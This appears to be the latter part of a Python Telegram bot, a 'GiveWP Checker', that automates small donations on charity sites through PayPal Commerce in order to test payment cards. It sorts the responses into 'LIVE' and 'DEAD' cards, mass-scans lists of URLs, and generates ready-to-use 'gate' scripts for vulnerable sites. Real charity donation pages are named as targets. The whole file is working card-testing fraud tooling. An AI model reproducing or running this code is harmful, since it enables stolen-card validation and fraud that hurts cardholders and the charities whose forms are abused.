            "give-form-url": (None, self.url),
            "give-form-minimum": (None, "5.00"),
            "give-form-maximum": (None, "999999.99"),
            "give-form-hash": (None, self.nonce),
            "give-price-id": (None, self.price_id),
            "give-amount": (None, amt),
            "payment-mode": (None, "paypal-commerce"),
            "give-gateway": (None, "paypal-commerce"),
            "give_first": (None, random.choice(["James","John","Michael"])),
            "give_last": (None, random.choice(["Smith","Johnson","Williams"])),
            "give_email": (None, f"u{{random.randint(1000,99999)}}@gmail.com"),
            "card_name": (None, "Test Bot"),
        }})

    def _create(self, amt):
        data = self._build(amt)
        headers = {{"content-type": data.content_type, "origin": self.base,
                    "referer": self.url, "user-agent": UA}}
        try:
            r = self.r.post(self.ajax_url, params={{"action": "give_paypal_commerce_create_order"}},
                            headers=headers, data=data, cookies=self.r.cookies, timeout=20)
            js = r.json()
            if isinstance(js.get("data"), dict) and js["data"].get("id"):
                return js["data"]["id"]
        except: pass
        return None

    def _confirm(self, order_id, cc):
        try:
            parts = cc.strip().split("|")
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            if "20" in yy: yy = yy.split("20")[1]
            if len(yy) == 4: yy = yy[2:]
            headers = {{
                "authority": "cors.api.paypal.com", "accept": "*/*",
                "authorization": f"Bearer {{self.access_token}}",
                "braintree-sdk-version": BRAINTREE_SDK,
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "paypal-client-metadata-id": PAYPAL_METADATA_ID,
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": UA,
            }}
            json_data = {{"payment_source": {{"card": {{
                "number": n, "expiry": f"20{{yy}}-{{mm}}", "security_code": cvc,
                "attributes": {{"verification": {{"method": "SCA_WHEN_REQUIRED"}}}}}}},
                "application_context": {{"vault": False}}}}
            r = self.r.post(f"https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source",
                            headers=headers, json=json_data, timeout=25)
            return r
        except: return None

    def _approve(self, order_id, amt):
        data = self._build(amt)
        headers = {{"content-type": data.content_type, "origin": self.base,
                    "referer": self.url, "user-agent": UA}}
        try:
            r = self.r.post(self.ajax_url,
                            params={{"action": "give_paypal_commerce_approve_order", "order": order_id}},
                            headers=headers, data=data, cookies=self.r.cookies, timeout=20)
            return r
        except: return None

    def _classify(self, resp):
        if not resp: return "NO_RESPONSE"
        text = resp.text
        try:
            js = json.loads(text)
            if js.get("success") is True: return "CHARGE_SUCCESS"
            if js.get("success") is False:
                data = js.get("data", {{}})
                err = json.dumps(data).upper()
                for code in ["ORDER_NOT_APPROVED", "INSUFFICIENT_FUNDS", "PAYER_CANNOT_PAY",
                             "DO_NOT_HONOR", "GENERIC_DECLINE", "EXPIRED_CARD",
                             "CVV2_FAILURE", "SUSPECTED_FRAUD"]:
                    if code in err: return code
        except: pass
        for code in ["CHARGE_SUCCESS", "ORDER_NOT_APPROVED", "INSUFFICIENT_FUNDS",
                     "PAYER_CANNOT_PAY", "DO_NOT_HONOR"]:
            if code in text.upper(): return code
        return "UNKNOWN_ERROR"

    def charge(self, cc):
        """cc = 'n|mm|yy|cvc'"""
        if not self._extract_token():
            return {{"status": "DEAD", "code": "NO_TOKEN", "raw": ""}}
        order_id = self._create(self.amount)
        if not order_id:
            return {{"status": "DEAD", "code": "CREATE_FAILED", "raw": ""}}
        confirm = self._confirm(order_id, cc)
        if confirm and confirm.status_code in (400, 422):
            code = self._classify(confirm)
            status = "LIVE" if code in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS",
                                         "PAYER_CANNOT_PAY","DO_NOT_HONOR","GENERIC_DECLINE",
                                         "EXPIRED_CARD","CVV2_FAILURE","SUSPECTED_FRAUD"] else "DEAD"
            return {{"status": status, "code": code, "raw": confirm.text[:500]}}
        approve = self._approve(order_id, self.amount)
        if approve:
            code = self._classify(approve)
            status = "LIVE" if code in ["CHARGE_SUCCESS","ORDER_NOT_APPROVED"] else "DEAD"
            return {{"status": status, "code": code, "raw": approve.text[:500]}}
        return {{"status": "DEAD", "code": "ALL_FAILED", "raw": ""}}


if __name__ == "__main__":
    bot = PayPal()
    result = bot.charge("{test_card}")
    print(f"Status: {{result['status']}}")
    print(f"Code: {{result['code']}}")
    print(f"Raw: {{result['raw'][:300]}}")
'''


def generate_gate_file(url, result, form_info, amount, card):
    p = urlparse(url)
    return GATE_TEMPLATE.format(
        url=url, host=p.netloc,
        path=p.path + ("?" + p.query if p.query else ""),
        form_id1=form_info.get("form_id_prefix", ""),
        form_id2=form_info.get("form_id", ""),
        nonce=form_info.get("nonce", ""),
        price_id=form_info.get("price_id", "3"),
        amount=amount or "5.00",
        form_id=form_info.get("form_id", "?"),
        domain=p.netloc,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        test_card=card,
    )


# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
def safe_send(chat_id, text, reply_markup=None):
    try: return bot.send_message(chat_id, text, reply_markup=reply_markup)
    except: return None

def safe_edit(chat_id, msg_id, text):
    try: return bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
    except: return None

def safe_send_doc(chat_id, file_bytes, filename, caption=""):
    try: return bot.send_document(chat_id, (filename, file_bytes), caption=caption)
    except Exception as e:
        print(f"doc: {e}")
        return None


@bot.message_handler(commands=["start"])
def cmd_start(message):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    text = f"""<b>🌐 GiveWP Checker Bot v22</b>

<b>User:</b> {message.from_user.first_name}
<b>ID:</b> <code>{message.from_user.id}</code>

━━━━━━━━━━━━━━━━━━━━
/paypal <code>&lt;url&gt;</code> — فحص موقع
/test — فحص 3 مواقع
/mass — فحص ملف
/stop — إيقاف
━━━━━━━━━━━━━━━━━━━━
⚡ Playwright + Gate Generator 🔥"""
    safe_send(message.chat.id, text, reply_markup=kb)


@bot.callback_query_handler(func=lambda c: c.data == "help")
def cb_help(call):
    text = """<b>📖 Help</b>

<b>الاستخدام:</b>
<code>/paypal https://site.com/donate</code>

البوت:
1. يفتح المتصفح
2. يلاقي الفورم ويملأ البيانات
3. يختار المبلغ ويضغط تبرع
4. يدخل الكارت في PayPal
5. يقرأ الرد النهائي

<b>لو LIVE:</b>
✅ يبعتلك ملف Python جاهز
📊 تقرير كامل بالبيانات

<b>النتائج:</b>
✅ LIVE — كارت اترفض من PayPal (رد حقيقي)
❌ DEAD — فشل/gateway معطل"""
    try:
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
    except: pass


@bot.message_handler(commands=["paypal"])
def cmd_paypal(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        safe_send(message.chat.id, "❌ Usage: <code>/paypal URL</code>")
        return
    url = parts[1].strip()
    if not url.startswith(("http://", "https://")):
        safe_send(message.chat.id, "❌ Invalid URL")
        return

    status_msg = safe_send(message.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
    if not status_msg: return

    def run():
        start = time.time()
        try:
            result = check_site(url, TEST_CARD)
            elapsed = time.time() - start
            status = result["status"]
            code = result["code"]
            raw = result.get("raw", "")
            debug = result.get("debug", {})

            if status == "LIVE":
                # ابني الملف
                form_info = debug.get("extracted", {})
                amount = debug.get("amount_selected") or "5.00"
                gate_code = generate_gate_file(url, result, form_info, amount, TEST_CARD)
                domain = urlparse(url).netloc.replace(".", "_")
                filename = f"gate_{domain}_{int(time.time())}.py"

                # ابعت الملف
                safe_send_doc(
                    message.chat.id,
                    BytesIO(gate_code.encode("utf-8")),
                    filename,
                    caption=f"✅ Gate: {filename}"
                )

                # التقرير الكامل
                report = f"""✅ <b>𝐆𝐚𝐭𝐞 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>
- - - - - - - - - - - - - - - - - - - - - - - - -
[⚡] <b>Domain:</b> <code>{urlparse(url).netloc}</code>
[⚡] <b>Form ID:</b> <code>{form_info.get("form_id", "?")}</code>
[⚡] <b>Amount:</b> <code>${amount}</code>
[⚡] <b>Extracted:</b> <code>{datetime.now().strftime("%H:%M:%S")}</code>
- - - - - - - - - - - - - - - - - - - - - - - - -
🧪 <b>𝐆𝐚𝐭𝐞 𝐓𝐞𝐬𝐭:</b>
[⚡] <b>Card:</b> <code>{TEST_CARD[:10]}****</code>
[⚡] <b>Response:</b> <code>{code}</code>
[⚡] <b>Status:</b> ✅ LIVE
[⚡] <b>Time:</b> <code>{elapsed:.1f}s</code>
- - - - - - - - - - - - - - - - - - - - - - - - -
[⚡] 📄 <b>Gate file ready to use!</b>
[⚡] 📝 <b>Function:</b> <code>(cc)</code>
[⚡] 📌 <b>Format:</b> <code>cc|mm|yy|cvv</code>
- - - - - - - - - - - - - - - - - - - - - - - - -"""
                safe_edit(message.chat.id, status_msg.message_id, report)
            else:
                icon = "❌"
                text = f"""{icon} <b>{status}</b> | <code>{code}</code>

🔗 <code>{url[:100]}</code>
⏱️ <code>{elapsed:.1f}s</code>"""
                if raw:
                    text += f"\n\n📝 <b>Raw:</b>\n<code>{raw[:400]}</code>"
                safe_edit(message.chat.id, status_msg.message_id, text)

        except Exception as e:
            safe_edit(message.chat.id, status_msg.message_id, f"❌ Error: {str(e)[:200]}")

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["test"])
def cmd_test(message):
    sites = [
        ("dandelions", "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
        ("stychnohumanitarian", "https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
        ("svdpvenicefl", "https://svdpvenicefl.org/donations/donations/"),
    ]
    status_msg = safe_send(message.chat.id, f"🔍 Testing {len(sites)} sites...")
    if not status_msg: return

    def run():
        results = []
        for name, url in sites:
            try:
                safe_edit(message.chat.id, status_msg.message_id,
                          f"🔍 {name}... ({len(results)}/{len(sites)})")
                r = check_site(url, TEST_CARD)
                results.append((name, r["status"], r["code"]))
            except Exception as e:
                results.append((name, "ERROR", str(e)[:40]))

        text = "<b>📊 Results:</b>\n\n"
        for n, s, c in results:
            icon = "✅" if s == "LIVE" else "❌"
            text += f"{icon} <b>{n}</b>: {c}\n"
        safe_edit(message.chat.id, status_msg.message_id, text)

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    safe_send(message.chat.id, "⏹️ No active process")


@bot.message_handler(commands=["mass"])
def cmd_mass(message):
    safe_send(message.chat.id, "📁 Send .txt file with URLs (one per line)")


@bot.message_handler(content_types=["document"])
def on_doc(message):
    try:
        fi = bot.get_file(message.document.file_id)
        data = bot.download_file(fi.file_path)
        links = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
        if not links:
            safe_send(message.chat.id, "❌ Empty file")
            return
        status_msg = safe_send(message.chat.id, f"📊 Scanning {len(links)} links...")
        if not status_msg: return

        def run():
            live = 0
            for i, link in enumerate(links):
                try:
                    safe_edit(message.chat.id, status_msg.message_id,
                              f"📊 {i+1}/{len(links)}\n✅ Live: {live}\n\n<code>{link[:60]}</code>")
                    r = check_site(link, TEST_CARD)
                    if r["status"] == "LIVE":
                        live += 1
                        form_info = r.get("debug", {}).get("extracted", {})
                        amount = r.get("debug", {}).get("amount_selected") or "5.00"
                        gate_code = generate_gate_file(link, r, form_info, amount, TEST_CARD)
                        domain = urlparse(link).netloc.replace(".", "_")
                        filename = f"gate_{domain}_{int(time.time())}.py"
                        safe_send_doc(message.chat.id, BytesIO(gate_code.encode("utf-8")),
                                     filename, caption=f"✅ {link[:80]}\n📄 {filename}")
                except: pass
            safe_edit(message.chat.id, status_msg.message_id,
                      f"📊 Done!\n\n✅ Live: {live}\n❌ Dead: {len(links)-live}")

        threading.Thread(target=run, daemon=True).start()
    except Exception as e:
        safe_send(message.chat.id, f"❌ Error: {str(e)[:100]}")


if __name__ == "__main__":
    print("=" * 60)
    print("🔥 GiveWP Bot v22 — Complete Edition")
    print("=" * 60)
    print(f"Playwright: {'✅' if HAS_PW else '❌'}")
    print(f"Browsers: {os.environ.get('PLAYWRIGHT_BROWSERS_PATH', 'default')}")
    print("✅ Starting...")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
    except KeyboardInterrupt:
        print("\n⏹️ Stopped")
    except Exception as e:
        print(f"❌ {e}")
        traceback.print_exc()
